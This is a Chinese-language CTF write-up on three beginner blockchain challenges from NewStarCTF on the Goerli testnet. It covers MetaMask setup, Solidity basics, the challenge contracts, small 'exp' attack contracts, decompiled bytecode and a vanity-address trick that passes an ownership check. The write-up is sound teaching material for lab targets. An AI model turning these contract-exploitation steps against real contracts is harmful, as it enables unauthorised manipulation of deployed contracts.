0x01 前置知识
=========

metamask准备
----------

谷歌商店下载metamask，然后按照步骤生成自己的账户，记得牢记自己的密码，别搞丢了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-339b42890f16cd369638b56e633647ba3ce72c92.png)

一开始网络是没有测试网络的，需要自己打开，选择Georli，因为题目都部署在Georli这个测试网络上。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-4ef9a9ee7ed02f2aa260d5326c48b9653f26953c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-be5dfdf17fc9e799c58e9692441243fe05fa94d2.png)

可以看到Goerli测试网络，选择它就行了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-25b4ad1cae93cd616cb5c40459659fdf4c5763a2.png)

入门小trick
--------

### Solidity入门

`Solidity`是区块链题目中常用编写语言，所以我们做题需要先学习这个Solidity的语法和一些常用关键词。下面的教程比较详细，可以简单翻阅有个印象。

`https://wtf.academy/solidity-start/HelloWeb3`

**这里就简单总结一下一些Solidity在题目中比较需要的语法&amp;知识点吧**：

> 1. memory：函数里的参数和临时变量一般用memory，存储在内存中，不上链。
> 2. address：可以存储一个 20 字节的值，也就是一个以太坊的地址大小。有普通的地址和可以转账ETH的地址（payable）。payable的地址拥有balance和transfer()两个成员，分别是ETH的余额查询和转账。
> 3. 函数写法： `function <function name> (<parameter types>) {internal|external|public|private} [pure|view|payable] [returns (<return types>)]`
> 4. {internal|external|public|private}：函数可见性说明符，一共4种。没标明函数类型的，默认internal。
> 5. returns加在函数名后面，用于声明返回的变量类型及变量名；return用于函数主体中，返回指定的变量。
> 6. storage（合约的状态变量）赋值给本地storage（函数里的）时候，会创建引用，改变新变量会影响原变量；storage赋值给memory，会创建独立的复本，修改其中一个不会影响另一个，反之亦然；memory赋值给memory，会创建引用，改变新变量会影响原变量；其他情况，变量赋值给storage，会创建独立的复本，修改其中一个不会影响另一个。
> 7. constant变量必须在声明的时候初始化，之后再也不能改变。immutable变量可以在声明时或构造函数中初始化，更加灵活。
> 8. 构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的owner地址
> 9. 修饰器（modifier）是solidity特有的语法，类似于面向对象编程中的decorator，声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。modifier的主要使用场景是运行函数前的检查，例如地址，变量，余额等。定义一个叫做onlyOwner的modifier，代有onlyOwner修饰符的函数只能被owner地址调用，这也是最常用的控制智能合约权限的方法。
> 10. Solidity中的事件（event）是EVM上日志的抽象，事件的声明由event关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。

### 水龙头

可以每天白嫖0.1ETH来着，做题目要用，所以需要获取一下。

`https://goerlifaucet.com/`

### 反编译网址

有些题目需要反编译出合约的源代码，这个可以帮助我们实现。

`https://ethervm.io/decompile`

### 区块链浏览器

可以查看各个账户或者合约详细交易数据，非常方便。

`https://goerli.etherscan.io`

0X02 NewStarCTF
===============

Checkin
-------

### 题目描述

> 简简单单的签到题 （所有Blockchain题目均部署在Goerli测试网） Goerli水龙头：<https://goerlifaucet.com/> nc 124.221.212.109 10000

### 解题过程

nc连接看看情况，发现需要先建立一个临时挑战账户，输入1可以生成一个账户

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d117295eb15878104f02e9fc9a7f7fae2984fe61.png)

然后往上面生成的账户里转一点ETH，我转了0.1ETH够用了，继续执行步骤二会生成对应的token值以及对应的需要被攻击的合约地址，需要记录下面的值，后面还需要使用。

```php
[+] token: v4.local.iaVylcsfINKTJ5Of6kXHOe1uGU_WHfprCM_kfHiLkmGJWGZUeOYqWp1e9DgdnCT0wS9gj_GQmV4Pw_iCUEs9ep0kIde4mMqzm9WsY3f2I0LNuc1lE4snmcwkacfUP7UD_RGs3-1BJsfWDsW8YTEMkC7pFgb3mymjSz9oxwl8sdSWRw
[+] please transfer 0.001 test ether to the deployer account for next step
```

然后就需要获取合约的源代码了，如下图所示：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-5c378bd237d01f5e619b98354260445656092dcc.png)

源码：

```php
pragma solidity 0.8.7;

contract Checkin {
    string greeting;

    constructor(string memory _greeting) public {
        greeting = _greeting;
    }

    function greet() public view returns (string memory) {
        return greeting;
    }

    function setGreeting(string memory _greeting) public {
        greeting = _greeting;
    }

    function isSolved() public view returns (bool) {
        string memory key = "HelloNewstarCTF";
        return keccak256(abi.encodePacked(key)) == keccak256(abi.encodePacked(greeting));
    }
}
```

分析合约源代码，逻辑比较简单，覆盖`greeting`的值为`HelloNewstarCTF`，然后调用`isSolved`检测成功就行，这样就算挑战成功了。exp如下

```php
contract exp{
    //首先确定被攻击的合约地址，就是题目环境中使用步骤2生成的那个合约地址。
    address transcation=0x19b0a2c1335cb365696Aa660b4b8fe4c781b5E2B;
    //将合约地址和被攻击合约的模板整合到一起
    Checkin target=Checkin(transcation);
    constructor()payable{}
    //自己定义一个攻击函数可供调用去攻击
    function hack() public returns(bool){
        bool ans=false;
        //根据被攻击合约地址的题目要求进行修改赋值
        string memory greeting="HelloNewstarCTF";
        target.setGreeting(greeting);
        //然后调用函数，检查是否满足事件要求
        ans=target.isSolved();
        return ans;
    }
}
```

攻击的具体步骤&amp;注意事项如下：

> 1、先deploy把自己写的合约部署起来。
> 
> 2、部署起来后，调用自己编写的合约的函数，去和题目的合约进行交互，攻击题目合约。
> 
> 3、部署和交互每次都需要支付Gas Price。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-cdeb2adc56200b52e570525d8460e2716da61a90.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-efa9f68654dd8326b5e2429d870f12442f342a25.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-9124e626cc9836809116196f5c6e080006b7e054.png)

攻击成功后，就拿着上面记录的token值，以及刚才产生交互的`Transaction Hash`提交即可。  
Transaction Hash可以点击交互完成后的那个`view on etherscan`，就会跳转到区块链浏览器进行查看详细交互信息。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-9ca9e2cc250ef0e186b01df964ccbecd486ead10.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-73c9a8beb8d4de739e8a025ae5f21deb142799f4.png)

### 稍稍总结一下：

1、拿到一个账户，获取token

```php
deployer account: 0xF092eCD00d7dCa228708C88a58e7F0b5a2041f8e
[+] token: v4.local.iaVylcsfINKTJ5Of6kXHOe1uGU_WHfprCM_kfHiLkmGJWGZUeOYqWp1e9DgdnCT0wS9gj_GQmV4Pw_iCUEs9ep0kIde4mMqzm9WsY3f2I0LNuc1lE4snmcwkacfUP7UD_RGs3-1BJsfWDsW8YTEMkC7pFgb3mymjSz9oxwl8sdSWRw
[+] please transfer 0.001 test ether to the deployer account for next step
```

2、向该地址发送合适数量的GoerliETH，进行合约的部署，返回交易地址

```php
input your token: v4.local.iaVylcsfINKTJ5Of6kXHOe1uGU_WHfprCM_kfHiLkmGJWGZUeOYqWp1e9DgdnCT0wS9gj_GQmV4Pw_iCUEs9ep0kIde4mMqzm9WsY3f2I0LNuc1lE4snmcwkacfUP7UD_RGs3-1BJsfWDsW8YTEMkC7pFgb3mymjSz9oxwl8sdSWRw
[+] contract address: 0x19b0a2c1335cb365696Aa660b4b8fe4c781b5E2B
[+] transaction hash: 0x1b1d06db5bfb3b4cd33dc8cba5f876a49a6fa10e80adfb11231300fb733564d3
```

3、拿到合约的源代码，审计题目要求，编写攻击合约

```php
pragma solidity 0.8.7;

contract Checkin {
    string greeting;

    constructor(string memory _greeting) public {
        greeting = _greeting;
    }

    function greet() public view returns (string memory) {
        return greeting;
    }

    function setGreeting(string memory _greeting) public {
        greeting = _greeting;
    }

    function isSolved() public view returns (bool) {
        string memory key = "HelloNewstarCTF";
        return keccak256(abi.encodePacked(key)) == keccak256(abi.encodePacked(greeting));
    }
}
contract exp{
    //首先确定被攻击的合约地址，就是题目环境中使用步骤2生成的那个合约地址。
    address transcation=0x19b0a2c1335cb365696Aa660b4b8fe4c781b5E2B;
    //将合约地址和被攻击合约的模板整合到一起
    Checkin target=Checkin(transcation);
    constructor()payable{}
    //自己定义一个攻击函数可供调用去攻击
    function hack() public returns(bool){
        bool ans=false;
        //根据被攻击合约地址的题目要求进行修改赋值
        string memory greeting="HelloNewstarCTF";
        target.setGreeting(greeting);
        //然后调用函数，检查是否满足事件要求
        ans=target.isSolved();
        return ans;
    }
}
```

4、调用攻击合约，然后获取flag

```php
input your token: v4.local.iaVylcsfINKTJ5Of6kXHOe1uGU_WHfprCM_kfHiLkmGJWGZUeOYqWp1e9DgdnCT0wS9gj_GQmV4Pw_iCUEs9ep0kIde4mMqzm9WsY3f2I0LNuc1lE4snmcwkacfUP7UD_RGs3-1BJsfWDsW8YTEMkC7pFgb3mymjSz9oxwl8sdSWRw
[+] flag: flag{Ea2y_B1ockChain_Ch3ckin}
```

guess number
------------

### 题目描述

> 猜猜数字是什么？ 0x168d2A47c58ae63ea2a2A4c622259c84086f791D@Goerli nc 124.221.212.109 10001

### 解题过程

这一道题直接给了一个账户地址，先去看看合约源码：

```php
contract guessnumber {
    mapping(address => uint) private answer;
    address owner;
    uint number;

    constructor()public{
        owner = msg.sender;
    }

    event isSolved();

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function set_number(uint new_number) public onlyOwner{
        number=new_number;
    }

    function guess(uint guess_number) public {
        answer[msg.sender]=guess_number;
        if(answer[msg.sender]==number){
            emit isSolved();
        }
    }
}
```

把合约地址拿去<https://ethervm.io/decompile> 反编译网址，需要选择**Ropstentestnet**，然后就可以拿到反编译出来的代码

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e380f316f2193f2df8f132a0d9c8d8d06233a023.png)

```php
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;

        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }

        var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 & 0xffffffff;

        if (var0 == 0x9189fec1) {
            // Dispatch table entry for guess(uint256)
            var var1 = msg.value;

            if (var1) { revert(memory[0x00:0x00]); }

            var1 = 0x007c;
            var var2 = msg.data[0x04:0x24];
            guess(var2);
            stop();
        } else if (var0 == 0xd6d1ee14) {
            // Dispatch table entry for 0xd6d1ee14 (unknown)
            var1 = msg.value;

            if (var1) { revert(memory[0x00:0x00]); }

            var1 = 0x00a9;
            var2 = msg.data[0x04:0x24];
            func_0166(var2);
            stop();
        } else { revert(memory[0x00:0x00]); }
    }

    function guess(var arg0) {
        memory[0x00:0x20] = msg.sender;
        memory[0x20:0x40] = 0x00;
        storage[keccak256(memory[0x00:0x40])] = arg0;
        memory[0x00:0x20] = msg.sender;
        memory[0x20:0x40] = 0x00;

        if (storage[keccak256(memory[0x00:0x40])] != storage[0x02]) { return; }

        var temp0 = memory[0x40:0x60];
        log(memory[temp0:temp0 + memory[0x40:0x60] - temp0], [0x64d98f6e85818c863123cc7e7c79d2ac44938374a37adc38f66a1e53a1898ec0]);
    }

    function func_0166(var arg0) {
        if (msg.sender != storage[0x01] & 0xffffffffffffffffffffffffffffffffffffffff) { revert(memory[0x00:0x00]); }

        storage[0x02] = arg0;
    }
}
```

看到反编译出来的源码就头大了，又臭又长，不太想看。区块链交易，应该会留下大佬们攻击成功的数据，所以选择去  
<https://goerli.etherscan.io/address/0x168d2a47c58ae63ea2a2a4c622259c84086f791d>  
找找看，可以直接找到别人成功的数据，都不用自己逆了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-9bc539aaa00fbfc1fb15c9a7d7711aeb1285baae.png)

然后按照第一题那样子写个代码去和题目合约交互，传入guess\_number,触发事件isSolved()，就算攻击成功了。

```php
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
contract guessnumber {
    mapping(address => uint) private answer;
    address owner;
    uint number;

    constructor()public{
        owner = msg.sender;
    }

    event isSolved();

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function set_number(uint new_number) public onlyOwner{
        number=new_number;
    }

    function guess(uint guess_number) public {
        answer[msg.sender]=guess_number;
        if(answer[msg.sender]==number){
            emit isSolved();
        }
    }
}
contract exp{
    address instance = 0x168d2A47c58ae63ea2a2A4c622259c84086f791D;
    guessnumber target=guessnumber(instance);
    constructor()payable{}
    function hack() public{
        target.guess(0x0000000000000000000000000000000000000000000675db03dcfd8684be44c6);
    }
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-478064eba0396fd406240f2750bba57af982d33a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-c94f3b54b6d164ffadbe1324a1792ccebdf69a0a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-19cbdac3bf648032d1dc51a832834fa38fbab012.png)

the chosen one
--------------

### 题目描述

> 只有天选之人才能做出这道题，你是其中之一吗？ nc 124.221.212.109 10002

### 解题过程

交互生成账户部署题目，记得往账户里存点ETH

```php
[+] deployer account: 0xAF975d7C719Ce1CBCa1533Fa6253c2F42A9D6C5F
[+] token: v4.local.dPRThsvagvMCwC2QcRrrWWAh_55S9Rj0Fi3COtbxBfsnaTYsGsCdbBhdfNmZRrN9NOsV74FgiaQLRb8lyqAYGzZ3pmQj20Gv5L-L7zLnhqPrOMBnvmRLtOXczXFztquH9vVvd3XXTtTYIQZFYW5olwdHBu3XaPfw7Doo19dM5gOXsA

[+] contract address: 0xD15559f6f4da334aCE7630eb16Ed8a44B65acefe
[+] transaction hash: 0x4fcfdac56180c1c3fe45335810c9e590ebaaded6bf715a1cf554a7f1bcb9da38
```

然后拿到合约源码，开始审计，发现需要账户开头是`0xabcd`的

```php
contracts/Example.sol
pragma solidity ^0.4.24;

contract choose {
    address owner;

    event isSolved();

    constructor() public{
        owner = msg.sender;
    }

    function chooseone() public{
        require(uint(msg.sender) & 0xffff==0xabcd);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function getflag() onlyOwner {
        emit isSolved();
    }
}
```

这里使用这个网址：<https://vanity-eth.tk/> 生成特定后缀的Ethereum vanity addresses

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-2734f44041ce8d209549574f67f89dc92be1d03f.png)

save时设置一下密码将这个地址下载下来，然后使用metamask的导入账户，将这个json文件导入进去就会生成一个特定后缀abcd的地址账户了。**不要忘记往里面转一点ETH，才能做题。**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-7ee65a03492a76f880dcb9fa2302abe9ca657563.png)

断开原先账户和remix的连接，然后用刚刚生成的账户重新连接，可以发现remix下的账户已经改变成了后缀为abcd的账户了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-2a266f1d67eaaf21f09c3dcf757abc5d915fefb3.png)

这里我们不用编写攻击合约了，直接使用如下图所示的**At Address**，**填入从步骤2获得的合约地址，直接获取合约部署就行了。**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-a0af251227d345e5ebb813806f54c647d8078833.png)

可以清楚看到有两个可以执行交互的函数，需要先执行`chooseone`检测账户是否为**abcd后缀**，然后才能调用`getflag`，**按顺序调用就可以了**。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-81235db807b36f9e33f7e08bc06c4c72a789c31c.png)

```php
输入对应的token，以及攻击成功的合约地址就可以拿到flag了。
v4.local.dPRThsvagvMCwC2QcRrrWWAh_55S9Rj0Fi3COtbxBfsnaTYsGsCdbBhdfNmZRrN9NOsV74FgiaQLRb8lyqAYGzZ3pmQj20Gv5L-L7zLnhqPrOMBnvmRLtOXczXFztquH9vVvd3XXTtTYIQZFYW5olwdHBu3XaPfw7Doo19dM5gOXsA
0x78414a3f8cb6eea265a53677c4dad8c7e57ada9b12e1acc3e1fd4b2488e607f9
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-42b8d18037749f020d75d888fb0ee26197b212e1.png)

0x03 总结
=======

区块链的题目还是很有意思的，主要的难度就是在于`Solidity`语言上面，需要提前熟悉一下`Solidity`语言的语法以及他的一些特性；还有就是关于区块链的一些基本常识了，需要了解合约的一些正常交互流程以及合约部署的步骤，总之学习到了很多。